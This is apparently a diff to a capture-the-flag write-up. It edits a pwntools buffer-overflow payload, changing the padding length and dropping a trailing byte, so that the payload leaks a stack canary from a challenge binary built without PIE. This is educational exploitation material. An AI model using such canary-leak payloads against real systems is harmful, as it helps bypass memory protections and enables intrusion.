@@ -89,7 +89,7 @@ gcc chal.c -o chal --no-pie
 
 If we then write the payload using pwntools we can get the canary.
 ```py
-payload = b"a"*0x28 + b"\x01"
+payload = b"a"*0x29
 p.send(payload)
 print(p.recvline())
 ```
